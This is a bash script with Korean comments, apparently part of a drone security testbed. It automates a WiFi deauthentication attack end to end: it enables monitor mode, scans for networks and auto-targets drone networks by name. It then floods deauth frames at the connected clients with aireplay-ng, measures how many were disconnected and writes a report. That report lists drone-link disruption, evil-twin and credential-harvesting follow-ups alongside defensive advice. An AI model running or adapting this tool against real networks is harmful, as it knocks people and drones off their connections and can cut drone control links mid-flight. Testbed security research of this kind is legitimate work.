#!/bin/bash
# wifi_deauth.sh - WiFi 인증 해제 공격 도구
# Path: /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/denial_of_service/wifi_deauth.sh

source "$(dirname "$0")/../common/colors.sh"
source "$(dirname "$0")/../common/utils.sh"

ATTACK_NAME="WiFi Deauthentication Attack"
LOG_FILE="$(get_log_dir)/wifi_deauth.log"

print_banner() {
    echo -e "${CYAN}"
    echo "╔═══════════════════════════════════════╗"
    echo "║           Wifi Deauth attack          ║"
    echo "╚═══════════════════════════════════════╝"
    echo -e "${NC}"
}

check_prerequisites() {
    log_info "Checking prerequisites..."
    
    local required_tools=("aircrack-ng" "airodump-ng" "aireplay-ng" "airmon-ng" "iwconfig")
    for tool in "${required_tools[@]}"; do
        if ! command -v "$tool" &> /dev/null; then
            log_error "$tool is not installed"
            echo "Install with: sudo apt-get install aircrack-ng"
            exit 1
        fi
    done
    
    # 루트 권한 확인
    if [[ $EUID -ne 0 ]]; then
        log_error "This attack requires root privileges"
        echo "Run with: sudo $0"
        exit 1
    fi
    
    log_success "Prerequisites check completed"
}

detect_wireless_interfaces() {
    log_info "Detecting wireless interfaces..."
    
    local interfaces=()
    local monitor_interfaces=()
    
    # 일반 인터페이스 탐지
    while IFS= read -r line; do
        if [[ $line =~ ^[[:space:]]*([^[:space:]]+)[[:space:]]+IEEE[[:space:]]802.11 ]]; then
            local iface="${BASH_REMATCH[1]}"
            interfaces+=("$iface")
        fi
    done < <(iwconfig 2>/dev/null)
    
    # 모니터 모드 인터페이스 탐지
    while IFS= read -r line; do
        if [[ $line =~ mon[0-9]+ ]]; then
            monitor_interfaces+=("${BASH_REMATCH[0]}")
        fi
    done < <(iwconfig 2>/dev/null)
    
    echo -e "${CYAN}Available wireless interfaces:${NC}"
    for iface in "${interfaces[@]}"; do
        echo "  └─ $iface (managed mode)"
    done
    
    for mon_iface in "${monitor_interfaces[@]}"; do
        echo "  └─ $mon_iface (monitor mode)"
    done
    
    # 최적 인터페이스 선택
    if [[ ${#monitor_interfaces[@]} -gt 0 ]]; then
        echo "${monitor_interfaces[0]}"
    elif [[ ${#interfaces[@]} -gt 0 ]]; then
        echo "${interfaces[0]}"
    else
        echo ""
    fi
}

setup_monitor_mode() {
    local interface="$1"
    
    log_info "Setting up monitor mode on $interface..."
    
    # 이미 모니터 모드인지 확인
    if iwconfig "$interface" 2>/dev/null | grep -q "Mode:Monitor"; then
        log_success "Interface $interface already in monitor mode"
        echo "$interface"
        return
    fi
    
    # 인터페이스 다운
    echo -e "${YELLOW}[*] Bringing down interface $interface...${NC}"
    ip link set "$interface" down 2>/dev/null
    
    # 기존 프로세스 종료
    echo -e "${YELLOW}[*] Killing interfering processes...${NC}"
    airmon-ng check kill >/dev/null 2>&1
    
    # 모니터 모드 시작
    echo -e "${YELLOW}[*] Starting monitor mode...${NC}"
    local monitor_output=$(airmon-ng start "$interface" 2>/dev/null)
    
    # 모니터 인터페이스 이름 추출
    local monitor_iface=""
    if echo "$monitor_output" | grep -q "monitor mode enabled"; then
        monitor_iface=$(echo "$monitor_output" | grep -o '[a-zA-Z0-9]*mon[a-zA-Z0-9]*' | head -1)
        if [[ -z "$monitor_iface" ]]; then
            monitor_iface="${interface}mon"
        fi
    else
        log_error "Failed to enable monitor mode"
        return 1
    fi
    
    # 확인
    if iwconfig "$monitor_iface" 2>/dev/null | grep -q "Mode:Monitor"; then
        log_success "Monitor mode enabled on $monitor_iface"
        echo "$monitor_iface"
    else
        log_error "Failed to verify monitor mode"
        return 1
    fi
}

scan_networks() {
    local monitor_iface="$1"
    local scan_duration="${2:-20}"
    
    log_info "Scanning for WiFi networks..."
    
    local scan_file="/tmp/wifi_scan_$(date +%s)"
    
    echo -e "${YELLOW}[*] Starting network scan for ${scan_duration} seconds...${NC}"
    echo -e "${CYAN}[*] Press Ctrl+C to stop scan early${NC}"
    
    # airodump-ng 백그라운드 실행
    timeout "$scan_duration" airodump-ng "$monitor_iface" \
        --write "$scan_file" \
        --output-format csv 2>/dev/null &
    
    local airodump_pid=$!
    
    # 스캔 진행 상황 표시
    local count=0
    while kill -0 $airodump_pid 2>/dev/null && [[ $count -lt $scan_duration ]]; do
        sleep 1
        ((count++))
        echo -ne "\r${GREEN}[*] Scanning... ${count}/${scan_duration}s${NC}"
    done
    echo ""
    
    wait $airodump_pid 2>/dev/null
    
    # 결과 파일 확인
    local csv_file="${scan_file}-01.csv"
    if [[ ! -f "$csv_file" ]]; then
        log_error "Scan failed - no results file found"
        return 1
    fi
    
    echo "$csv_file"
}

parse_scan_results() {
    local csv_file="$1"
    
    log_info "Parsing scan results..."
    
    # CSV 파일에서 네트워크 정보 추출
    local networks=()
    
    # 헤더 라인 찾기
    local ap_section_start=$(grep -n "BSSID, First time seen" "$csv_file" | cut -d: -f1)
    local station_section_start=$(grep -n "Station MAC, First time seen" "$csv_file" | cut -d: -f1)
    
    if [[ -z "$ap_section_start" ]]; then
        log_error "Invalid scan results format"
        return 1
    fi
    
    # 스테이션 섹션이 없으면 파일 끝까지
    if [[ -z "$station_section_start" ]]; then
        station_section_start=$(wc -l < "$csv_file")
    fi
    
    echo -e "${GREEN}=== Discovered Networks ===${NC}"
    
    # AP 정보 파싱
    local ap_count=0
    while IFS=',' read -r bssid first_seen last_seen channel speed privacy cipher auth power beacons iv lan_ip id_length essid key; do
        # 빈 라인이나 헤더 스킵
        [[ -z "$bssid" || "$bssid" =~ ^[[:space:]]*BSSID ]] && continue
        
        # 공백 제거
        bssid=$(echo "$bssid" | tr -d ' ')
        essid=$(echo "$essid" | tr -d ' ')
        channel=$(echo "$channel" | tr -d ' ')
        privacy=$(echo "$privacy" | tr -d ' ')
        power=$(echo "$power" | tr -d ' ')
        
        # 유효한 BSSID인지 확인
        if [[ $bssid =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
            ((ap_count++))
            
            # ESSID가 비어있으면 <hidden> 표시
            [[ -z "$essid" ]] && essid="<hidden>"
            
            # 보안 타입 결정
            local security="Open"
            if [[ "$privacy" =~ WPA3 ]]; then
                security="WPA3"
            elif [[ "$privacy" =~ WPA2 ]]; then
                security="WPA2"
            elif [[ "$privacy" =~ WPA ]]; then
                security="WPA"
            elif [[ "$privacy" =~ WEP ]]; then
                security="WEP"
            fi
            
            # 드론 관련 네트워크 식별
            local drone_indicator=""
            if [[ "$essid" =~ (drone|Drone|DRONE|mavic|Mavic|MAVIC|phantom|Phantom|PHANTOM|DJI|dji) ]]; then
                drone_indicator=" ${RED}[DRONE NETWORK]${NC}"
            fi
            
            echo -e "${CYAN}[$ap_count] $essid${NC}$drone_indicator"
            echo "    └─ BSSID: $bssid"
            echo "    └─ Channel: $channel"
            echo "    └─ Security: $security"
            echo "    └─ Signal: ${power} dBm"
            echo ""
            
            # 네트워크 정보 저장
            networks+=("$ap_count:$bssid:$essid:$channel:$security:$power")
        fi
    done < <(sed -n "${ap_section_start},$((station_section_start-1))p" "$csv_file" | tail -n +2)
    
    if [[ $ap_count -eq 0 ]]; then
        log_warning "No networks found"
        return 1
    fi
    
    log_success "Found $ap_count networks"
    
    # 네트워크 배열을 global 변수로 export
    declare -g DISCOVERED_NETWORKS=("${networks[@]}")
}

select_target_network() {
    log_info "Selecting target network..."
    
    if [[ ${#DISCOVERED_NETWORKS[@]} -eq 0 ]]; then
        log_error "No networks available for selection"
        return 1
    fi
    
    echo -e "${YELLOW}[?] Select target network (1-${#DISCOVERED_NETWORKS[@]}) or 'auto' for drone networks: ${NC}"
    read -t 30 selection
    
    local target_network=""
    
    if [[ "$selection" == "auto" ]]; then
        # 자동으로 드론 네트워크 선택
        for network in "${DISCOVERED_NETWORKS[@]}"; do
            local essid=$(echo "$network" | cut -d: -f3)
            if [[ "$essid" =~ (drone|Drone|DRONE|mavic|Mavic|MAVIC|phantom|Phantom|PHANTOM|DJI|dji) ]]; then
                target_network="$network"
                break
            fi
        done
        
        if [[ -z "$target_network" ]]; then
            log_warning "No drone networks found, selecting first network"
            target_network="${DISCOVERED_NETWORKS[0]}"
        fi
    elif [[ "$selection" =~ ^[0-9]+$ ]] && [[ $selection -ge 1 ]] && [[ $selection -le ${#DISCOVERED_NETWORKS[@]} ]]; then
        target_network="${DISCOVERED_NETWORKS[$((selection-1))]}"
    else
        log_warning "Invalid selection, using first network"
        target_network="${DISCOVERED_NETWORKS[0]}"
    fi
    
    # 타겟 정보 추출
    local target_id=$(echo "$target_network" | cut -d: -f1)
    local target_bssid=$(echo "$target_network" | cut -d: -f2)
    local target_essid=$(echo "$target_network" | cut -d: -f3)
    local target_channel=$(echo "$target_network" | cut -d: -f4)
    local target_security=$(echo "$target_network" | cut -d: -f5)
    
    echo -e "${GREEN}Target Selected:${NC}"
    echo "  └─ ESSID: $target_essid"
    echo "  └─ BSSID: $target_bssid"
    echo "  └─ Channel: $target_channel"
    echo "  └─ Security: $target_security"
    
    echo "$target_bssid:$target_essid:$target_channel"
}

scan_clients() {
    local monitor_iface="$1"
    local target_bssid="$2"
    local target_channel="$3"
    local scan_duration="${4:-15}"
    
    log_info "Scanning for connected clients..."
    
    # 채널 고정
    iwconfig "$monitor_iface" channel "$target_channel" 2>/dev/null
    
    local client_scan_file="/tmp/client_scan_$(date +%s)"
    
    echo -e "${YELLOW}[*] Scanning for clients on channel $target_channel for ${scan_duration} seconds...${NC}"
    
    # 특정 BSSID만 스캔
    timeout "$scan_duration" airodump-ng "$monitor_iface" \
        --bssid "$target_bssid" \
        --channel "$target_channel" \
        --write "$client_scan_file" \
        --output-format csv 2>/dev/null &
    
    local scan_pid=$!
    
    # 진행 상황 표시
    local count=0
    while kill -0 $scan_pid 2>/dev/null && [[ $count -lt $scan_duration ]]; do
        sleep 1
        ((count++))
        echo -ne "\r${GREEN}[*] Client scanning... ${count}/${scan_duration}s${NC}"
    done
    echo ""
    
    wait $scan_pid 2>/dev/null
    
    # 클라이언트 결과 파싱
    local csv_file="${client_scan_file}-01.csv"
    if [[ ! -f "$csv_file" ]]; then
        log_warning "No client scan results found"
        echo ""
        return
    fi
    
    local clients=()
    local station_section_start=$(grep -n "Station MAC, First time seen" "$csv_file" | cut -d: -f1)
    
    if [[ -n "$station_section_start" ]]; then
        echo -e "${GREEN}=== Connected Clients ===${NC}"
        
        local client_count=0
        while IFS=',' read -r station_mac first_seen last_seen power packets bssid probed_essids; do
            # 빈 라인이나 헤더 스킵
            [[ -z "$station_mac" || "$station_mac" =~ ^[[:space:]]*Station ]] && continue
            
            # 공백 제거
            station_mac=$(echo "$station_mac" | tr -d ' ')
            bssid=$(echo "$bssid" | tr -d ' ')
            power=$(echo "$power" | tr -d ' ')
            
            # 유효한 MAC 주소이고 타겟 BSSID와 연결된 경우
            if [[ $station_mac =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] && [[ "$bssid" == "$target_bssid" ]]; then
                ((client_count++))
                echo -e "${CYAN}[$client_count] Client: $station_mac${NC}"
                echo "    └─ Signal: ${power} dBm"
                echo "    └─ Connected to: $target_bssid"
                
                clients+=("$station_mac")
            fi
        done < <(tail -n +$((station_section_start + 1)) "$csv_file")
        
        if [[ $client_count -eq 0 ]]; then
            echo -e "${YELLOW}No active clients found${NC}"
        else
            log_success "Found $client_count connected clients"
        fi
    fi
    
    # 클라이언트 목록 반환 (공백으로 구분)
    echo "${clients[*]}"
}

execute_deauth_attack() {
    local monitor_iface="$1"
    local target_bssid="$2"
    local target_essid="$3"
    local target_channel="$4"
    local clients_list="$5"
    local attack_duration="${6:-60}"
    
    log_info "Executing WiFi deauthentication attack..."
    
    # 채널 설정
    iwconfig "$monitor_iface" channel "$target_channel" 2>/dev/null
    
    echo -e "${RED}[!] Starting deauthentication attack${NC}"
    echo -e "${CYAN}Target Network: $target_essid ($target_bssid)${NC}"
    echo -e "${CYAN}Attack Duration: ${attack_duration} seconds${NC}"
    echo -e "${CYAN}Press Ctrl+C to stop attack${NC}"
    echo ""
    
    # 공격 시작 시간 기록
    local start_time=$(date +%s)
    local frames_sent=0
    
    if [[ -n "$clients_list" ]]; then
        # 특정 클라이언트들 대상 공격
        echo -e "${YELLOW}[*] Targeting specific clients...${NC}"
        
        local clients_array=($clients_list)
        for client in "${clients_array[@]}"; do
            echo -e "${YELLOW}[*] Deauthenticating client: $client${NC}"
            
            # 클라이언트별 공격 (백그라운드)
            (
                while [[ $(($(date +%s) - start_time)) -lt $attack_duration ]]; do
                    aireplay-ng --deauth 5 -a "$target_bssid" -c "$client" "$monitor_iface" 2>/dev/null
                    ((frames_sent += 5))
                    sleep 2
                done
            ) &
        done
    else
        # 브로드캐스트 공격 (모든 클라이언트)
        echo -e "${YELLOW}[*] Broadcasting deauth frames to all clients...${NC}"
        
        (
            while [[ $(($(date +%s) - start_time)) -lt $attack_duration ]]; do
                aireplay-ng --deauth 10 -a "$target_bssid" "$monitor_iface" 2>/dev/null
                ((frames_sent += 10))
                sleep 1
            done
        ) &
    fi
    
    # 공격 진행 상황 모니터링
    local elapsed=0
    while [[ $elapsed -lt $attack_duration ]]; do
        sleep 5
        elapsed=$(($(date +%s) - start_time))
        
        local remaining=$((attack_duration - elapsed))
        echo -e "\r${GREEN}[*] Attack progress: ${elapsed}s / ${attack_duration}s (${remaining}s remaining)${NC}"
    done
    
    # 모든 백그라운드 프로세스 종료
    pkill -f "aireplay-ng.*--deauth" 2>/dev/null
    
    echo ""
    log_success "Deauthentication attack completed"
    echo -e "${CYAN}Estimated frames sent: $frames_sent${NC}"
    
    # 공격 결과 반환
    echo "$frames_sent:$elapsed"
}

monitor_attack_effectiveness() {
    local monitor_iface="$1"
    local target_bssid="$2"
    local target_channel="$3"
    local pre_attack_clients="$4"
    
    log_info "Monitoring attack effectiveness..."
    
    echo -e "${YELLOW}[*] Checking client disconnections...${NC}"
    
    # 공격 후 클라이언트 재스캔 (짧은 시간)
    local post_attack_clients=$(scan_clients "$monitor_iface" "$target_bssid" "$target_channel" 10)
    
    # 클라이언트 수 비교
    local pre_count=$(echo "$pre_attack_clients" | wc -w)
    local post_count=$(echo "$post_attack_clients" | wc -w)
    
    echo -e "${GREEN}=== Attack Effectiveness ===${NC}"
    echo "  └─ Clients before attack: $pre_count"
    echo "  └─ Clients after attack: $post_count"
    echo "  └─ Clients disconnected: $((pre_count - post_count))"
    
    # 개별 클라이언트 상태 확인
    if [[ -n "$pre_attack_clients" ]]; then
        echo -e "${CYAN}Client Status:${NC}"
        local pre_array=($pre_attack_clients)
        local post_array=($post_attack_clients)
        
        for client in "${pre_array[@]}"; do
            if [[ " ${post_array[*]} " =~ " ${client} " ]]; then
                echo "  └─ $client: ${YELLOW}Still connected${NC}"
            else
                echo "  └─ $client: ${RED}Disconnected${NC}"
            fi
        done
    fi
    
    # 재연결 모니터링
    echo -e "${YELLOW}[*] Monitoring for reconnections (30s)...${NC}"
    local reconnect_clients=$(scan_clients "$monitor_iface" "$target_bssid" "$target_channel" 30)
    local reconnect_count=$(echo "$reconnect_clients" | wc -w)
    
    echo "  └─ Clients reconnected: $reconnect_count"
    
    local effectiveness=$((((pre_count - post_count) * 100) / (pre_count > 0 ? pre_count : 1)))
    echo "  └─ Attack effectiveness: ${effectiveness}%"
}

generate_attack_report() {
    local target_bssid="$1"
    local target_essid="$2"
    local attack_results="$3"
    local effectiveness="$4"
    
    log_info "Generating attack report..."
    
    local frames_sent=$(echo "$attack_results" | cut -d: -f1)
    local attack_duration=$(echo "$attack_results" | cut -d: -f2)
    
    local report_file="$(get_log_dir)/wifi_deauth_report_$(date +%Y%m%d_%H%M%S).txt"
    
    cat > "$report_file" << EOF
╔═══════════════════════════════════════════════════╗
║             WIFI DEAUTH REPORT                    ║
╚═══════════════════════════════════════════════════╝

Date: $(date)
Attack Type: WiFi Deauthentication
Target Network: $target_essid
Target BSSID: $target_bssid

╔═══ ATTACK SUMMARY ═══╗

Attack Duration: ${attack_duration} seconds
Deauth Frames Sent: $frames_sent
Attack Method: 802.11 Deauthentication Frames
Success Rate: $effectiveness

╔═══ TARGET ANALYSIS ═══╗

$(cat "$LOG_FILE" | grep -A 10 "Discovered Networks" | tail -10)

╔═══ ATTACK EXECUTION ═══╗

$(cat "$LOG_FILE" | grep -A 15 "Executing WiFi deauthentication attack" | tail -15)

╔═══ EFFECTIVENESS ASSESSMENT ═══╗

$(cat "$LOG_FILE" | grep -A 10 "Attack Effectiveness" | tail -10)

╔═══ SECURITY IMPLICATIONS ═══╗

1. Network Vulnerabilities
   - Unprotected management frames
   - Lack of 802.11w (PMF) protection
   - Predictable reconnection behavior

2. Impact Assessment
   - Communication disruption
   - Service denial
   - Potential for follow-up attacks

3. Attack Vectors
   - Continuous deauthentication
   - Client isolation
   - Man-in-the-middle preparation

╔═══ EXPLOITATION OPPORTUNITIES ═══╗

1. Communication Disruption
   - Drone-GCS link interruption
   - Failsafe mode triggering
   - Emergency landing scenarios

2. Attack Preparation
   - Evil twin setup preparation
   - Credential harvesting opportunity
   - Network topology mapping

3. Persistent Attacks
   - Automated deauth loops
   - Multiple target coordination
   - Timing-based attacks

╔═══ DEFENSIVE RECOMMENDATIONS ═══╗

1. 네트워크 보안 강화
   - 802.11w (PMF) 활성화
   - 강력한 암호화 사용
   - 클라이언트 격리 설정

2. 모니터링 구현
   - 무선 침입 탐지 시스템
   - 비정상 디스커넥션 알림
   - RF 스펙트럼 모니터링

3. 대응 방안
   - 자동 재연결 메커니즘
   - 백업 통신 채널
   - 물리적 보안 조치

╚═══════════════════════╝
EOF

    log_success "Report saved to: $report_file"
    echo -e "${GREEN}Report location: $report_file${NC}"
}

cleanup() {
    log_info "Cleaning up..."
    
    # 모니터 모드 정리
    if [[ -n "$MONITOR_INTERFACE" ]]; then
        echo -e "${YELLOW}[*] Disabling monitor mode on $MONITOR_INTERFACE...${NC}"
        airmon-ng stop "$MONITOR_INTERFACE" >/dev/null 2>&1
    fi
    
    # 임시 파일 정리
    rm -f /tmp/wifi_scan_* /tmp/client_scan_* 2>/dev/null
    
    # 백그라운드 프로세스 정리
    pkill -f "aireplay-ng" 2>/dev/null
    pkill -f "airodump-ng" 2>/dev/null
}

main() {
    print_banner
    check_prerequisites
    
    log_info "Starting WiFi deauthentication attack..."
    echo "Attack: $ATTACK_NAME" >> "$LOG_FILE"
    echo "Timestamp: $(date)" >> "$LOG_FILE"
    echo "================================" >> "$LOG_FILE"
    
    # 무선 인터페이스 감지
    local interface=$(detect_wireless_interfaces)
    if [[ -z "$interface" ]]; then
        log_error "No wireless interface found"
        exit 1
    fi
    
    # 모니터 모드 설정
    local monitor_iface=$(setup_monitor_mode "$interface")
    if [[ -z "$monitor_iface" ]]; then
        log_error "Failed to setup monitor mode"
        exit 1
    fi
    
    export MONITOR_INTERFACE="$monitor_iface"
    
    # 네트워크 스캔
    echo -e "\n${BLUE}[*] Scanning for WiFi networks...${NC}"
    local scan_file=$(scan_networks "$monitor_iface" 20)
    if [[ -z "$scan_file" ]]; then
        log_error "Network scan failed"
        cleanup
        exit 1
    fi
    
    # 스캔 결과 파싱
    parse_scan_results "$scan_file" | tee -a "$LOG_FILE"
    
    if [[ ${#DISCOVERED_NETWORKS[@]} -eq 0 ]]; then
        log_error "No networks discovered"
        cleanup
        exit 1
    fi
    
    # 타겟 네트워크 선택
    echo -e "\n${BLUE}[*] Selecting target network...${NC}"
    local target_info=$(select_target_network)
    local target_bssid=$(echo "$target_info" | cut -d: -f1)
    local target_essid=$(echo "$target_info" | cut -d: -f2)
    local target_channel=$(echo "$target_info" | cut -d: -f3)
    
    # 클라이언트 스캔
    echo -e "\n${BLUE}[*] Scanning for connected clients...${NC}"
    local clients=$(scan_clients "$monitor_iface" "$target_bssid" "$target_channel" 15)
    
    # 공격 실행
    echo -e "\n${BLUE}[*] Executing deauthentication attack...${NC}"
    local attack_results=$(execute_deauth_attack "$monitor_iface" "$target_bssid" "$target_essid" "$target_channel" "$clients" 60)
    
    # 효과 모니터링
    echo -e "\n${BLUE}[*] Monitoring attack effectiveness...${NC}"
    monitor_attack_effectiveness "$monitor_iface" "$target_bssid" "$target_channel" "$clients" | tee -a "$LOG_FILE"
    
    # 보고서 생성
    local effectiveness=$(cat "$LOG_FILE" | grep "Attack effectiveness:" | tail -1 | awk '{print $3}')
    generate_attack_report "$target_bssid" "$target_essid" "$attack_results" "$effectiveness"
    
    cleanup
    
    log_success "WiFi deauthentication attack completed"
    echo "Attack completed at $(date)" >> "$LOG_FILE"
}

# Signal handlers for graceful cleanup
trap cleanup EXIT
trap 'echo -e "\n${RED}Attack interrupted${NC}"; cleanup; exit 1' INT TERM

# Execute main function
main "$@"